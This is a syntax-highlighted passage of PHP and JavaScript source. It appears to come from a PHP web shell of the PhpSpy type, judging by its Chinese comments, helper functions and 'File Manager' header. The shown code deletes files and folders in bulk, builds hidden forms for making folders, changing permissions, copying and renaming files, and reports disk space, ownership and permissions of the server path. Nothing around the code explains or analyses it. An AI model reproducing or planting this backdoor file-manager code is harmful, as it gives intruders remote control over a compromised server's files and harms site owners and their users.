<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #888a85;">// </span><span style="color: #888a85;">&#25209;&#37327;&#21024;&#38500;&#25991;&#20214;</span>
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #729fcf; font-weight: bold;">elseif</span>($<span style="color: #eeeeec;">doing</span> == <span style="color: #ad7fa8; font-style: italic;">'delfiles'</span>) {
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #729fcf; font-weight: bold;">if</span> ($<span style="color: #eeeeec;">dl</span>) {
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> $<span style="color: #eeeeec;">dfiles</span>=<span style="color: #ad7fa8; font-style: italic;">''</span>;
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> $<span style="color: #eeeeec;">succ</span> = $<span style="color: #eeeeec;">fail</span> = <span style="color: #eeeeec; background-color: #2e3436;">0</span>;
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #729fcf; font-weight: bold;">foreach</span> ($<span style="color: #eeeeec;">dl</span> <span style="color: #729fcf; font-weight: bold;">as</span> $<span style="color: #eeeeec;">filepath</span>) {
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #729fcf; font-weight: bold;">if</span> (<span style="color: #eeeeec; background-color: #2e3436;">is_dir(</span>$<span style="color: #eeeeec;">filepath</span>)) {
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #729fcf; font-weight: bold;">if</span> (@<span style="color: #eeeeec; background-color: #2e3436;">deltree(</span>$<span style="color: #eeeeec;">filepath</span>)) {
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> $<span style="color: #eeeeec;">succ</span>++;
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> } <span style="color: #729fcf; font-weight: bold;">else</span> {
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> $<span style="color: #eeeeec;">fail</span>++;
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> }
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> } <span style="color: #729fcf; font-weight: bold;">else</span> {
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #729fcf; font-weight: bold;">if</span> (@<span style="color: #eeeeec; background-color: #2e3436;">unlink(</span>$<span style="color: #eeeeec;">filepath</span>)) {
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> $<span style="color: #eeeeec;">succ</span>++;
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> } <span style="color: #729fcf; font-weight: bold;">else</span> {
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> $<span style="color: #eeeeec;">fail</span>++;
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> }
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> }
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> }
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">m(</span><span style="color: #ad7fa8; font-style: italic;">'Deleted folder/file have finished,choose '</span>.<span style="color: #eeeeec; background-color: #2e3436;">count(</span>$<span style="color: #eeeeec;">dl</span>).<span style="color: #ad7fa8; font-style: italic;">' success '</span>.$<span style="color: #eeeeec;">succ</span>.<span style="color: #ad7fa8; font-style: italic;">' fail '</span>.$<span style="color: #eeeeec;">fail</span>);
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> } <span style="color: #729fcf; font-weight: bold;">else</span> {
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">m(</span><span style="color: #ad7fa8; font-style: italic;">'Please select folder/file(s)'</span>);
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> }
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> }

<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #888a85;">//</span><span style="color: #888a85;">&#25805;&#20316;&#23436;&#27605;</span>
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">formhead(array(</span><span style="color: #ad7fa8; font-style: italic;">'name'</span>=<span style="color: #8ae234;">&gt;</span><span style="color: #ad7fa8; font-style: italic;">'createdir'</span>));
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">makehide(</span><span style="color: #ad7fa8; font-style: italic;">'newdirname'</span>);
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">makehide(</span><span style="color: #ad7fa8; font-style: italic;">'dir'</span>,$<span style="color: #eeeeec;">nowpath</span>);
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">formfoot(</span>);
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">formhead(array(</span><span style="color: #ad7fa8; font-style: italic;">'name'</span>=&gt;<span style="color: #ad7fa8; font-style: italic;">'fileperm'</span>));
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">makehide(</span><span style="color: #ad7fa8; font-style: italic;">'newperm'</span>);
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">makehide(</span><span style="color: #ad7fa8; font-style: italic;">'pfile'</span>);
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">makehide(</span><span style="color: #ad7fa8; font-style: italic;">'dir'</span>,$<span style="color: #eeeeec;">nowpath</span>);
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">formfoot(</span>);
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">formhead(array(</span><span style="color: #ad7fa8; font-style: italic;">'name'</span>=&gt;<span style="color: #ad7fa8; font-style: italic;">'copyfile'</span>));
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">makehide(</span><span style="color: #ad7fa8; font-style: italic;">'sname'</span>);
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">makehide(</span><span style="color: #ad7fa8; font-style: italic;">'tofile'</span>);
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">makehide(</span><span style="color: #ad7fa8; font-style: italic;">'dir'</span>,$<span style="color: #eeeeec;">nowpath</span>);
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">formfoot(</span>);
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">formhead(array(</span><span style="color: #ad7fa8; font-style: italic;">'name'</span>=&gt;<span style="color: #ad7fa8; font-style: italic;">'rename'</span>));
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">makehide(</span><span style="color: #ad7fa8; font-style: italic;">'oldname'</span>);
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">makehide(</span><span style="color: #ad7fa8; font-style: italic;">'newfilename'</span>);
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">makehide(</span><span style="color: #ad7fa8; font-style: italic;">'dir'</span>,$<span style="color: #eeeeec;">nowpath</span>);
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">formfoot(</span>);
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">formhead(array(</span><span style="color: #ad7fa8; font-style: italic;">'name'</span>=&gt;<span style="color: #ad7fa8; font-style: italic;">'fileopform'</span>, <span style="color: #ad7fa8; font-style: italic;">'target'</span>=&gt;<span style="color: #ad7fa8; font-style: italic;">'_blank'</span>));
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">makehide(</span><span style="color: #ad7fa8; font-style: italic;">'action'</span>);
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">makehide(</span><span style="color: #ad7fa8; font-style: italic;">'opfile'</span>);
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">makehide(</span><span style="color: #ad7fa8; font-style: italic;">'dir'</span>);
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">formfoot(</span>);
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">formhead(array(</span><span style="color: #ad7fa8; font-style: italic;">'name'</span>=&gt;<span style="color: #ad7fa8; font-style: italic;">'getsize'</span>));
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">makehide(</span><span style="color: #ad7fa8; font-style: italic;">'getdir'</span>);
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">makehide(</span><span style="color: #ad7fa8; font-style: italic;">'dir'</span>);
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">formfoot(</span>);

<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> $<span style="color: #eeeeec;">free</span> = @<span style="color: #eeeeec; background-color: #2e3436;">disk_free_space(</span>$<span style="color: #eeeeec;">nowpath</span>);
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> !$<span style="color: #eeeeec;">free</span> &amp;&amp; $<span style="color: #eeeeec;">free</span> = <span style="color: #eeeeec; background-color: #2e3436;">0</span>;
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> $<span style="color: #eeeeec;">all</span> = @<span style="color: #eeeeec; background-color: #2e3436;">disk_total_space(</span>$<span style="color: #eeeeec;">nowpath</span>);
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> !$<span style="color: #eeeeec;">all</span> &amp;&amp; $<span style="color: #eeeeec;">all</span> = <span style="color: #eeeeec; background-color: #2e3436;">0</span>;
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> $<span style="color: #eeeeec;">used</span> = $<span style="color: #eeeeec;">all</span>-$<span style="color: #eeeeec;">free</span>;
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">p(</span><span style="color: #ad7fa8; font-style: italic;">'&lt;h2&gt;File Manager - Current disk free '</span>.<span style="color: #eeeeec; background-color: #2e3436;">sizecount(</span>$<span style="color: #eeeeec;">free</span>).<span style="color: #ad7fa8; font-style: italic;">' of '</span>.<span style="color: #eeeeec; background-color: #2e3436;">sizecount(</span>$<span style="color: #eeeeec;">all</span>).<span style="color: #ad7fa8; font-style: italic;">' ('</span>.@<span style="color: #eeeeec; background-color: #2e3436;">round(100</span>/($<span style="color: #eeeeec;">all</span>/$<span style="color: #eeeeec;">free</span>),<span style="color: #eeeeec; background-color: #2e3436;">2</span>).<span style="color: #ad7fa8; font-style: italic;">'%)&lt;/h2&gt;'</span>);

<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> $<span style="color: #eeeeec;">cwd_links</span> = <span style="color: #ad7fa8; font-style: italic;">''</span>;
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> $<span style="color: #eeeeec;">path</span> = <span style="color: #eeeeec; background-color: #2e3436;">explode(</span><span style="color: #ad7fa8; font-style: italic;">'/'</span>, $<span style="color: #eeeeec;">nowpath</span>);
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> $<span style="color: #eeeeec;">n</span>=<span style="color: #eeeeec; background-color: #2e3436;">count(</span>$<span style="color: #eeeeec;">path</span>);
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #729fcf; font-weight: bold;">for</span>($<span style="color: #eeeeec;">i</span>=<span style="color: #eeeeec; background-color: #2e3436;">0</span>;$<span style="color: #eeeeec;">i</span>&lt;$<span style="color: #eeeeec;">n</span>-<span style="color: #eeeeec; background-color: #2e3436;">1</span>;$<span style="color: #eeeeec;">i</span>++) {
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> $<span style="color: #eeeeec;">cwd_links</span> .= <span style="color: #ad7fa8; font-style: italic;">'&lt;a href="javascript:godir(\''</span>;
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #729fcf; font-weight: bold;">for</span>($<span style="color: #eeeeec;">j</span>=<span style="color: #eeeeec; background-color: #2e3436;">0</span>;$<span style="color: #eeeeec;">j</span>&lt;=$<span style="color: #eeeeec;">i</span>;$<span style="color: #eeeeec;">j</span>++) {
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> $<span style="color: #eeeeec;">cwd_links</span> .= $<span style="color: #eeeeec;">path</span>[$<span style="color: #eeeeec;">j</span>].<span style="color: #ad7fa8; font-style: italic;">'/'</span>;
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> }
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> $<span style="color: #eeeeec;">cwd_links</span> .= <span style="color: #ad7fa8; font-style: italic;">'\');"&gt;'</span>.$<span style="color: #eeeeec;">path</span>[$<span style="color: #eeeeec;">i</span>].<span style="color: #ad7fa8; font-style: italic;">'/&lt;/a&gt;'</span>;
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> }

<span style="color: #729fcf;">?&gt;</span>
<span style="color: #8ae234;">&lt;script</span> <span style="color: #8ae234;">type=</span><span style="color: #ad7fa8; font-style: italic;">"text/javascript"</span><span style="color: #8ae234;">&gt;</span>
<span style="color: #f57900; font-weight: bold;">document</span>.<span style="color: #f57900; font-weight: bold;">onclick</span> = <span style="color: #f57900; font-weight: bold;">shownav</span>;
<span style="color: #729fcf; font-weight: bold;">function</span> <span style="color: #edd400; font-weight: bold; font-style: italic;">shownav</span>(<span style="color: #f57900; font-weight: bold;">e</span>){
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #729fcf; font-weight: bold;">var</span> <span style="color: #f57900; font-weight: bold;">src</span> = <span style="color: #f57900; font-weight: bold;">e</span>?<span style="color: #f57900; font-weight: bold;">e</span>.<span style="color: #f57900; font-weight: bold;">target</span>:<span style="color: #f57900; font-weight: bold;">event</span>.<span style="color: #f57900; font-weight: bold;">srcElement</span>;
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #729fcf; font-weight: bold;">do</span>{
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #729fcf; font-weight: bold;">if</span>(<span style="color: #f57900; font-weight: bold;">src</span>.<span style="color: #f57900; font-weight: bold;">id</span> ==<span style="color: #ad7fa8; font-style: italic;">"jumpto"</span>) {
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">$(</span><span style="color: #ad7fa8; font-style: italic;">'inputnav'</span>).<span style="color: #f57900; font-weight: bold;">style</span>.<span style="color: #f57900; font-weight: bold;">display</span> = <span style="color: #ad7fa8; font-style: italic;">""</span>;
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">$(</span><span style="color: #ad7fa8; font-style: italic;">'pathnav'</span>).<span style="color: #f57900; font-weight: bold;">style</span>.<span style="color: #f57900; font-weight: bold;">display</span> = <span style="color: #ad7fa8; font-style: italic;">"none"</span>;
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #888a85;">//</span><span style="color: #888a85;">hidenav();</span>
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #729fcf; font-weight: bold;">return</span>;
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> }
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #729fcf; font-weight: bold;">if</span>(<span style="color: #f57900; font-weight: bold;">src</span>.<span style="color: #f57900; font-weight: bold;">id</span> ==<span style="color: #ad7fa8; font-style: italic;">"inputnav"</span>) {
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #729fcf; font-weight: bold;">return</span>;
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> }
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #f57900; font-weight: bold;">src</span> = <span style="color: #f57900; font-weight: bold;">src</span>.<span style="color: #f57900; font-weight: bold;">parentNode</span>;
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> }<span style="color: #729fcf; font-weight: bold;">while</span>(<span style="color: #f57900; font-weight: bold;">src</span>.<span style="color: #f57900; font-weight: bold;">parentNode</span>)

<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">$(</span><span style="color: #ad7fa8; font-style: italic;">'inputnav'</span>).<span style="color: #f57900; font-weight: bold;">style</span>.<span style="color: #f57900; font-weight: bold;">display</span> = <span style="color: #ad7fa8; font-style: italic;">"none"</span>;
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">$(</span><span style="color: #ad7fa8; font-style: italic;">'pathnav'</span>).<span style="color: #f57900; font-weight: bold;">style</span>.<span style="color: #f57900; font-weight: bold;">display</span> = <span style="color: #ad7fa8; font-style: italic;">""</span>;
}
<span style="color: #8ae234;">&lt;/script&gt;</span>
<span style="color: #8ae234;">&lt;div</span> <span style="color: #8ae234;">style=</span><span style="color: #ad7fa8; font-style: italic;">"background:#eee;margin-bottom:10px;"</span><span style="color: #8ae234;">&gt;</span>
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #8ae234;">&lt;table</span> <span style="color: #8ae234;">id=</span><span style="color: #ad7fa8; font-style: italic;">"pathnav"</span> <span style="color: #8ae234;">width=</span><span style="color: #ad7fa8; font-style: italic;">"100%"</span> <span style="color: #8ae234;">border=</span><span style="color: #ad7fa8; font-style: italic;">"0"</span> <span style="color: #8ae234;">cellpadding=</span><span style="color: #ad7fa8; font-style: italic;">"5"</span> <span style="color: #8ae234;">cellspacing=</span><span style="color: #ad7fa8; font-style: italic;">"0"</span><span style="color: #8ae234;">&gt;</span>
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #8ae234;">&lt;tr&gt;</span>
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #8ae234;">&lt;td</span> <span style="color: #8ae234;">width=</span><span style="color: #ad7fa8; font-style: italic;">"100%"</span><span style="color: #8ae234;">&gt;</span><span style="color: #729fcf;">&lt;?php</span> <span style="color: #729fcf; font-weight: bold;">echo</span> $<span style="color: #eeeeec;">cwd_links</span>.<span style="color: #ad7fa8; font-style: italic;">' - '</span>.<span style="color: #eeeeec; background-color: #2e3436;">getChmod(</span>$<span style="color: #eeeeec;">nowpath</span>).<span style="color: #ad7fa8; font-style: italic;">' / '</span>.<span style="color: #eeeeec; background-color: #2e3436;">getPerms(</span>$<span style="color: #eeeeec;">nowpath</span>).<span style="color: #eeeeec; background-color: #2e3436;">getUser(</span>$<span style="color: #eeeeec;">nowpath</span>);<span style="color: #729fcf;">?&gt;</span> (<span style="color: #729fcf;">&lt;?php</span> <span style="color: #729fcf; font-weight: bold;">echo</span> $<span style="color: #eeeeec;">dir_writeable</span>;<span style="color: #729fcf;">?&gt;</span>)<span style="color: #8ae234;">&lt;/td&gt;</span>
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #8ae234;">&lt;td</span> <span style="color: #f57900; font-weight: bold;">nowrap</span><span style="color: #8ae234;">&gt;&lt;input</span> <span style="color: #8ae234;">class=</span><span style="color: #ad7fa8; font-style: italic;">"bt"</span> <span style="color: #8ae234;">id=</span><span style="color: #ad7fa8; font-style: italic;">"jumpto"</span> <span style="color: #8ae234;">name=</span><span style="color: #ad7fa8; font-style: italic;">"jumpto"</span> <span style="color: #8ae234;">value=</span><span style="color: #ad7fa8; font-style: italic;">"Jump to"</span> <span style="color: #8ae234;">type=</span><span style="color: #ad7fa8; font-style: italic;">"button"</span><span style="color: #8ae234;">&gt;&lt;/td&gt;</span>
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #8ae234;">&lt;/tr&gt;</span>
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #8ae234;">&lt;/table&gt;</span>
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #8ae234;">&lt;table</span> <span style="color: #8ae234;">id=</span><span style="color: #ad7fa8; font-style: italic;">"inputnav"</span> <span style="color: #8ae234;">width=</span><span style="color: #ad7fa8; font-style: italic;">"100%"</span> <span style="color: #8ae234;">border=</span><span style="color: #ad7fa8; font-style: italic;">"0"</span> <span style="color: #8ae234;">cellpadding=</span><span style="color: #ad7fa8; font-style: italic;">"5"</span> <span style="color: #8ae234;">cellspacing=</span><span style="color: #ad7fa8; font-style: italic;">"0"</span> <span style="color: #8ae234;">style=</span><span style="color: #ad7fa8; font-style: italic;">"display:none;"</span><span style="color: #8ae234;">&gt;</span>
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #8ae234;">&lt;form</span> <span style="color: #8ae234;">action=</span><span style="color: #ad7fa8; font-style: italic;">""</span> <span style="color: #8ae234;">method=</span><span style="color: #ad7fa8; font-style: italic;">"post"</span> <span style="color: #8ae234;">id=</span><span style="color: #ad7fa8; font-style: italic;">"godir"</span> <span style="color: #8ae234;">name=</span><span style="color: #ad7fa8; font-style: italic;">"godir"</span><span style="color: #8ae234;">&gt;</span>
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #8ae234;">&lt;tr&gt;</span>
